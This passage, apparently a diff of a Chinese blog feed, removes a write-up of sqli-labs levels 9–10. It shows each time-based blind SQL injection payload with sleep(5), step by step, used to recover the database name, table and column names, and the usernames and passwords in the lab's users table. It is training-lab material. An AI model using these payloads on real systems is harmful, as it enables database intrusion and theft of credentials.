-<li><p>判断是否存在<strong>SQL注入</strong>并判断注入类型<br>输入?id&#x3D;1  显示：You are in………..<br>输入?id&#x3D;1’ 显示：You are in………..<br>输入?id&#x3D;1” 显示：You are in………..<br>此时我们应该发现端倪，页面可能不会返回任何信息<br>输入?id&#x3D;1 and sleep(5)--+  页面迅速显示<br>输入?id&#x3D;1’and sleep(5)--+  页面延迟了5s，说明的确是应当使用时间盲注<br>输入?id&#x3D;1’’and sleep(5)--+  页面迅速显示<br>说明是单引号字符型注入</p>
-</li>
-<li><p>获取当前<strong>数据库名和数据库版本号</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;and if(length((select database()))&gt;7,sleep(5),1)--+    页面迅速显示</span><br><span class="line">?id=1&#x27;and if(length((select database()))&gt;8,sleep(5),1)--+    页面延迟了5s</span><br></pre></td></tr></table></figure>
-<p>说明数据库名长度是8个字符<br>版本号以此类推</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;and if(ascii(substr((select database()),1,1))&gt;115,sleep(5),1)--+   页面迅速显示</span><br><span class="line">?id=1&#x27;and if(ascii(substr((select database()),1,1))&gt;114,sleep(5),1)--+   页面延迟了5s</span><br></pre></td></tr></table></figure>
-<p>最终尝试完后可得数据库名是security</p>
-</li>
-<li><p><strong>爆表</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;and if(length((select group_concat(table_name) from information_schema.tables where table_schema=database()))&gt;13,sleep(5),1)--+</span><br><span class="line">如此判断所有表名长度</span><br><span class="line">?id=1&#x27;and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))&gt;99,sleep(5),1)--+</span><br><span class="line">再逐一判断表名</span><br></pre></td></tr></table></figure>
-<p>最终尝试完后可得所需表名为users</p>
-</li>
-<li><p><strong>爆字段名</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;and if(length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;))&gt;20,sleep(5),1)--+</span><br><span class="line">判断所有字段名的长度</span><br><span class="line">?id=1&#x27;and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;),1,1))&gt;99,sleep(5),1)--+</span><br><span class="line">逐一判断字段名</span><br></pre></td></tr></table></figure>
-<p>最终出现了我们所需的字段名username, password</p>
-</li>
-<li><p><strong>爆数据</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and if(length((select group_concat(username,password) from users))&gt;109,sleep(5),1)--+</span><br><span class="line">判断字段内容长度</span><br><span class="line">?id=1&#x27; and if(ascii(substr((select group_concat(username,password) from users),1,1))&gt;50,sleep(5),1)--+</span><br><span class="line">逐一检测内容</span><br></pre></td></tr></table></figure>
-<p>最终得到了所需的数据</p>
-</li>
-</ol>
-<h2 id="第9关和第10关思路相同，不同点是第9关的单引号在第10关换成了双引号"><a href="#第9关和第10关思路相同，不同点是第9关的单引号在第10关换成了双引号" class="headerlink" title="第9关和第10关思路相同，不同点是第9关的单引号在第10关换成了双引号"></a>第9关和第10关思路相同，不同点是第9关的单引号在第10关换成了双引号</h2><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>我终于知道为什么别人写博客，有些关会写得相当简略了，因为都是一样的，确实没意思…</p>
-<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/dreamthe/article/details/123795302">详细sqli-labs（1-65）通关讲解</a></p>
-]]></content>
-      <categories>
-        <category>SQL注入</category>
-        <category>sqli-labs</category>
-      </categories>
-      <tags>
-        <tag>SQL注入</tag>
-        <tag>sqli-labs</tag>
       </tags>
   </entry>
   <entry>
